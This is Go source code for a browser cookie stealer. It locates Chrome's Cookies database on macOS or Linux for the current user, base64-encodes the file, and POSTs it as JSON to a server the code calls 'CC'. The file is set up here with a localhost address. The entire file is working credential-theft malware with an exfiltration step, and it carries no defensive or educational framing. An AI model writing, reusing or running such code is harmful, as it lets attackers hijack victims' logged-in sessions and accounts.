package main
import (
    "fmt"
    "runtime"
    "log"
    "bytes"
    "net/http"
    "encoding/base64"
    "encoding/json"
    "path/filepath"
    "io/ioutil"
    "os/user"
    _ "os"
    "crypto/cipher"
    "crypto/aes"
	_ "crypto/md5"
)

type JsonMessage struct {
    Name string
    Body string
}

func encryptSQLiteFile(inputFile string, key []byte) (string, error) {
    inputBytes, err := ioutil.ReadFile(inputFile)
    if err != nil {
        return "", err
    }
    // Create AES Cipher block
    ///*
    block, err := aes.NewCipher(key)
    if err != nil {
        return "", err
    }

    // Create cipher stream
    iv := make([]byte, aes.BlockSize)
    stream := cipher.NewCTR(block, iv)

    // Encrypt
    outputBytes := make([]byte, len(inputBytes))
    stream.XORKeyStream(outputBytes, inputBytes)
    //*/ 
    encoded := base64.StdEncoding.EncodeToString(inputBytes)
    return encoded, nil

}

func base64SQLiteFile(inputFile string) (string, error) {
	dbBytes, err := ioutil.ReadFile(inputFile)
	if err != nil {
		panic(err)
	}

    base64Encoded := base64.StdEncoding.EncodeToString(dbBytes)

    return base64Encoded, nil

}

func getCookieMacOS(user string) (filePath string) {
    defaultFilePath := filepath.Join("/Users/" + user, "Library/Application Support/Google/Chrome/Default/Cookies")
    return defaultFilePath
}

func getCookieLinux(user string) (filePath string) {
    defaultFilePath := filepath.Join("/home/" + user, "/.config/google-chrome/Default/Cookies")
    return defaultFilePath
}


func sendDataToServer(base64Encoded string, url string) { // function to send base64 encoded file to CC
    
    data := JsonMessage{Name: "message", Body: base64Encoded}

    payload, err := json.Marshal(data)
    if err != nil {
        fmt.Println("Error marshaling json", err)
        return
    }
    
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
    if err != nil {
        fmt.Println("Error creating request", err)
        return 
    }

    req.Header.Set("Content-Type", "application/json")
    resp, err := http.DefaultClient.Do(req)
    if err != nil {
        fmt.Println("Error sending request", err)
        return
    }
    defer resp.Body.Close()

}


func main() {

    //keyString := "supercoolkey16bt"
    //keyBytes := []byte(keyString)

    os := runtime.GOOS
    currentUser, err := user.Current()
    if err != nil {
        log.Fatalf(err.Error())
    }
    user := currentUser.Username
    var defaultFilePath string
    switch os {
        case "windows":
            fmt.Println("Windows", user)
        case "darwin":
            defaultFilePath = getCookieMacOS(user)
        case "linux":
            defaultFilePath = getCookieLinux(user)
        default:
            fmt.Println("%s.\n", os)
    }
    // Encrypt and base64 cookies
    base64Encoded, err := base64SQLiteFile(defaultFilePath)
    if err != nil {
        fmt.Println("ERROR", err)                
    }
    fmt.Println(base64Encoded)
    sendDataToServer(base64Encoded, "http://localhost:8080/index.php")
}

